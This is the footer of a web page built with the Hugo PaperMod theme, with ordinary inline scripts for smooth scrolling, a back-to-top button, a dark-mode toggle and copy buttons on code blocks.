<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>